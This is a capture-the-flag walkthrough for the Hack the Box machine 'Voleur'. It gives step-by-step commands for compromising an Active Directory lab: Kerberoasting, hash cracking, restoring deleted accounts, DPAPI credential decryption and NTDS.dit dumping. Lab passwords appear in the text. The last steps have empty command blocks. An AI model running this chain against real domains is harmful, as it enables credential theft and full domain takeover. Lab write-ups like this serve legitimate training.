# Voleur

**Platform: Hack the Box**

**OS: Windows**

**Diffculty: Medium**


## Table of Contents
- [Key Learnings](#key-learnings)
- [Walkthrough](#walkthrough)
- [Remediation Summary](#remediation-summary)


## Key Learnings

- Familiarize myself with enumerating AD networks using Bloodhound
- Learn to abuse WriteOwner privilege using Impacket's owneredit.py script
- Give an account FullControl using Impacket's dacledit.py tool
- Enumerate and restore deleted user accounts on PowerShell
- Exploit ESC15 vulnerable template
- Add user to Domain Admin group with an LDAP shell


## **Disclaimer: Potential spoilers below**


## Walkthrough

1. Run nmap scan along with bloodhound

![image](https://github.com/user-attachments/assets/9374b63e-36de-4aa2-96d2-ef3957b8f57b)

2. Bloodhound doesn't give us a path from credentials given ryan.naylor. After enumerating using netexec smb, found an interesting IT share so download files with the spider_plus module

`nxc smb dc.voleur.htb -u ryan.naylor -p 'HollowOct31Nyt' -k -M spider_plus -o DOWNLOAD_FLAG=True`

![image](https://github.com/user-attachments/assets/ac3f931f-437f-47de-a391-d6399fff89d4)

3. Trying to open the .xlsx file shows that it's password protected, so use the office2john script and crack password offline.

![image](https://github.com/user-attachments/assets/dd5ebfc5-ce1e-40e0-827c-8f31349acbd9)

4. Get rid of the filename in the beginning and crack using hashcat. We get the password!

`hashcat -m 9600 excel_hash.txt /usr/share/wordlists/rockyou.txt`

![image](https://github.com/user-attachments/assets/d164a5a2-e75c-4848-9d22-dabd4e0ef5fc)

5. Open the password protected excel file and we get a list of user credentials

![image](https://github.com/user-attachments/assets/c2658702-3661-4c3f-bf1a-0eb0b3792eb3)

6. Using svc_ldap's credentials, can do a targetedKerberoast attack on svc_winrm which has CanPSRemote rights to the machine.

![image](https://github.com/user-attachments/assets/fcef36ad-42ad-4e1b-ba51-1c44018acac6)

7. First, get TGT for svc_ldap using impacket's getTGT.py script and set KRB5CCNAME environment variable to use the ccache file.

`getTGT.py -k -dc-ip dc.voleur.htb voleur.htb/svc_ldap:'[PASSWORD]'`

![image](https://github.com/user-attachments/assets/7341c702-d2a8-43d7-91b4-736c41cfc8e0)

8. Now run targetedKerberoast.py with kerberos authentication

`targetedKerberoast.py -k --dc-ip 10.129.61.59 --dc-host dc.voleur.htb -v -d voleur.htb`

![image](https://github.com/user-attachments/assets/b86fc911-0c80-4d28-9d3e-08694c182c9a)

9. Crack hash offline using hashcat

`hashcat -m 13100 targetedKerberoast.txt /usr/share/wordlists/rockyou.txt`

10. Now get svc_winrm's TGT using the same process as before

`getTGT.py -k -dc-ip dc.voleur.htb voleur.htb/svc_winrm:'[PASSWORD]'`

11. Set the KRB5CCNAME env variable to the svc_winrm ccache file and evil-winrm into the machine. Compromised user flag!

![image](https://github.com/user-attachments/assets/f0804929-bd52-43f2-b9b3-a7128bff4132)

12. Looking at BloodHound, svc_ldap user is part of the RESTORE_USERS group. Use svc_ldap to get TGT and enumerate deleted objects via bloodyAD. Use the special -c flag with LDAP OID control 1.2.840.113556.1.4.2064 to show deleted, tombstoned, and recycled objects.  

`bloodyAD -u svc_ldap -d voleur.htb -p '[PASSWORD]' --host dc.voleur.htb --dc-ip 10.129.16.120 -k get search -c 1.2.840.113556.1.4.2064 --resolve-sd --base 'CN=Deleted Objects,DC=voleur,DC=htb' --filter "(objectClass=*)" --attr sAMAccountName`

<img width="858" height="277" alt="image" src="https://github.com/user-attachments/assets/7b3ee745-6e3a-4a59-9560-97e12ab52aab" />

13. Restore todd.wolfe user using bloodyAD

`bloodyAD -u svc_ldap -d voleur.htb -p '[PASSWORD]' --host dc.voleur.htb --dc-ip 10.129.16.120 -k set restore 'todd.wolfe'`

<img width="852" height="76" alt="image" src="https://github.com/user-attachments/assets/dfc5cc81-0a1b-4568-8766-2f2cfe19a164" />

14. Get TGT for todd.wolfe to authenticate as user. Todd wolfe's password is in the Access excel file

<img width="659" height="71" alt="image" src="https://github.com/user-attachments/assets/2c3cb778-85c6-4675-ad58-024470cc24cf" />

15. Use todd wolfe's credentials to download Todd's files on smb

`nxc smb dc.voleur.htb -k -u svc_ldap -p 'M1XyC9pW7qT5Vn' -d voleur.htb -M spider_plus -o DOWNLOAD_FLAG=True`

16. This downloads Todd's files from smb. We find DPAPI encrypted files. We first attempt to decrypt the masterkey with dpapi.py

`dpapi.py masterkey -file 08949382-134f-4c63-b93c-ce52efc0aa88 -sid 'S-1-5-21-3927696377-1337352550-2781715495-1110' -password 'NightT1meP1dg3on14'`

<img width="851" height="287" alt="image" src="https://github.com/user-attachments/assets/8c18726d-7dad-46e6-bea2-fbe32cf69629" />

17. Use the decrypted masterkey to decrypt a credential file

`dpapi.py credential -file 772275FAD58525253490A9B0039791D3 -key '0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83'`

<img width="854" height="234" alt="image" src="https://github.com/user-attachments/assets/7c1a1021-8d22-4799-9244-b046efcff9fa" />

18. And we got jeremy.combs' password! Use jeremy's credentials to download files from IT share once again

`nxc smb dc.voleur.htb -k -u jeremy.combs -p '[PASSWORD]' -d voleur.htb -M spider_plus -o DOWNLOAD_FLAG=True`

<img width="847" height="687" alt="image" src="https://github.com/user-attachments/assets/95d24049-da38-4b47-b978-e730f3744b24" />


19. We find a SSH id_rsa file. Looking back at the nmap scan, there is a SSH port open on 2222. Also, remembering the users listed on the Access_Review excel file, there was the user svc_backup. We use it to ssh into the machine as the svc_backup user

`ssh svc_backup@10.129.16.120 -p 2222 -i id_rsa`

<img width="564" height="438" alt="image" src="https://github.com/user-attachments/assets/8ff3d6dd-c124-4463-af64-472becb1b831" />


20. After much enumeration, we find a backup folder in the /mnt/c folder. In there, we find the NTDS.dit and SYSTEM registry hive, which we download onto our local attacker machine using ssh

``

<img width="698" height="86" alt="image" src="https://github.com/user-attachments/assets/1eeb5424-62ac-4aaf-8a31-10d4604a4290" />


21. With these 2 files, we can secretsdump to get the Admin hash and root the machine!

``

<img width="850" height="1020" alt="image" src="https://github.com/user-attachments/assets/6476c17f-bc3b-4fcc-a95c-c809d52f4638" />

22. 
